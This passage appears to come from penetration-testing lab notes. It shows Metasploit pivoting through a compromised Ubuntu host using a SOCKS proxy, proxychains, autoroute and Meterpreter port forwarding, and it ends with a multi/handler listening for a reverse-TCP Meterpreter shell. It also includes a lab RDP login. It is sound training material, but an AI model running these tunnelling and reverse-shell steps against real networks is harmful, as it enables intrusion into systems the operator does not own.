We can create a Meterpreter shell for the Ubuntu server.

Create SOCKs proxy within MSF while the shell is open

```shell-session
msf6 > use auxiliary/server/socks_proxy

msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
SRVPORT => 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
version => 4a
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
msf6 auxiliary(server/socks_proxy) > options

Module options (auxiliary/server/socks_proxy):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The address to listen on
   SRVPORT  9050             yes       The port to listen on
   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
                                        5)


Auxiliary action:

   Name   Description
   ----   -----------
   Proxy  Run a SOCKS proxy server
```

#### Confirming Proxy Server is Running

```shell-session
jobs
```

After initiating the SOCKS server, we will configure proxychains to route traffic generated by other tools like Nmap through our pivot on the compromised Ubuntu host. We can add the below line at the end of our `proxychains.conf` file located at `/etc/proxychains.conf` if it isn't already there.

#### Adding a Line to proxychains.conf if Needed

```shell-session
socks4 	127.0.0.1 9050
```


> [!NOTE]
> Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.

Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session. We can use the `post/multi/manage/autoroute` module from Metasploit to add routes for the 172.16.5.0 subnet and then route all our proxychains traffic.

#### Creating Routes with AutoRoute

```shell-session
msf6 > use post/multi/manage/autoroute

msf6 post(multi/manage/autoroute) > set SESSION 1
SESSION => 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
SUBNET => 172.16.5.0
msf6 post(multi/manage/autoroute) > run

[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: linux
[*] Running module against 10.129.202.64
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.129.0.0/255.255.0.0 from host's routing table.
[+] Route added to subnet 172.16.5.0/255.255.254.0 from host's routing table.
[*] Post module execution completed
```

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

```shell-session
meterpreter > run autoroute -s 172.16.5.0/23
```

After adding the necessary route(s) we can use the `-p` option to list the active routes to make sure our configuration is applied as expected.
#### Listing Active Routes with AutoRoute

```shell-session
run autoroute -p
```

#### Testing Proxy & Routing Functionality

```shell-session
proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
```

## Port Forwarding

Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to forward all the packets received on this port via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

#### Portfwd options

```shell-session
meterpreter > help portfwd

Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -h        Help banner.
    -i <opt>  Index of the port forward entry to interact with (see the "list" command).
    -l <opt>  Forward: local port to listen on. Reverse: local port to connect to.
    -L <opt>  Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p <opt>  Forward: remote port to connect to. Reverse: remote port to listen on.
    -r <opt>  Forward: remote host to connect to.
    -R        Indicates a reverse port forward.
```

#### Creating Local TCP Relay

```shell-session
meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
```

The above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

#### Connecting to Windows Target through localhost

  Meterpreter Tunneling & Port Forwarding

```shell-session
xfreerdp /v:localhost:3300 /u:victor /p:pass@123
```

#### Netstat Output

We can use Netstat to view information about the session we recently established. From a defensive perspective, we may benefit from using Netstat if we suspect a host has been compromised. This allows us to view any sessions a host has established.

```shell-session
netstat -antp

tcp        0      0 127.0.0.1:54652         127.0.0.1:3300          ESTABLISHED 4075/xfreerdp 
```

## Meterpreter Reverse Port Forwarding

Similar to local port forwards, Metasploit can also perform `reverse port forwarding` with the below command, where you might want to listen on a specific port on the compromised server and forward all incoming shells from the Ubuntu server to our attack host. We will start a listener on a new port on our attack host for Windows and request the Ubuntu server to forward all requests received to the Ubuntu server on port `1234` to our listener on port `8081`.

We can create a reverse port forward on our existing shell from the previous scenario using the below command. This command forwards all connections on port `1234` running on the Ubuntu server to our attack host on local port (`-l`) `8081`. We will also configure our listener to listen on port 8081 for a Windows shell.

#### Reverse Port Forwarding Rules

  Meterpreter Tunneling & Port Forwarding

```shell-session
meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
```

#### Configuring & Starting multi/handler

  Meterpreter Tunneling & Port Forwarding

```shell-session
meterpreter > bg

[*] Backgrounding session 1...
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
LPORT => 8081
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
LHOST => 0.0.0.0
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:8081 
```

We can now create a reverse shell payload that will send a connection back to our Ubuntu server on `172.16.5.129`:`1234` when executed on our Windows host. Once our Ubuntu server receives this connection, it will forward that to `attack host's ip`:`8081` that we configured.
